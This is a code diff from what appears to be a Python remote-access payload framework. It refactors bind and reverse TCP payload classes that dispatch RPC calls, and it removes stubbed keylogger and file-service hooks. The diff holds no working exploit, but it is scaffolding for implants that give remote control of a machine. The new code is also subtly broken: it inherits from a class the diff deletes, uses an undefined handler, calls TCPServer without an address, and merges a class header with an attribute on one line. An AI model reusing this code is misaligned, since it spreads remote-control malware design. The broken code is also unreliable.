@@ -9,44 +9,39 @@ from .. import sock
 from .. import rpc
 
 
-class PayloadRPCHandler(rpc.RPCHandler):
-    ''' Mix-in class that dispatches RPC requests. '''
+class SimpleSocketPayload(rpc.RPCHandler):
+    Connection = sock.Connection
 
-    def rpc_dir(self):
-        return list(self._functions)
-
-    def rpc_echo(self, s):
-        return s
-
-    def register_file_service(self, mode):
-        pass
-
-    def register_keylogger(self):
-        pass
+    def handle_request(self, request):
+        conn = self.Connection(request)
+        return super().handle_connection(conn)
 
 
 class PayloadRequestHandler(socketserver.BaseRequestHandler):
+    Payload = SimpleSocketPayload
+
+    def __init__(self, request, client_address, server, payload=None):
+        if payload is None:
+            payload = self.Payload()
+        self.payload = payload
+        super().__init__(request, client_address, server)
 
     def handle(self):
-        self.rpc.handle_connection(self.connection)
+        self.payload.handle_request(self.request)
 
 
-class TCPBindPayload(socketserver.TCPServer, PayloadRPCHandler):
-    RequestHandler = PayloadRequestHandler
-    Connection = sock.Connection
+class TCPBindPayload(SimpleSocketPayload):
 
-    def __init__(self, server_address, RequestHandler=None,
-            bind_and_activate=True):
-        super().__init__(self, server_address,
-                RequestHandler,
-                bind_and_activate,
+    def __init__(self):
+        self.server = socketserver.TCPServer(
+                RequestHandlerClass=RequestHandler,
         )
 
+    def serve_forever(self):
+        return self.server.serve_forever()
 
-class TCPReversePayload(sock.TCPClient, PayloadRPCHandler):
-    RequestHandler = PayloadRequestHandler
-    Connection = sock.Connection
-    
+
+class TCPReversePayload(sock.TCPClient, PayloadRPCHandler): Payload = SimpleSocketPayload 
     def __init__(self, addr, retry_interval=1):
         sock.TCPClient.__init__(self, addr, retry_interval)
 
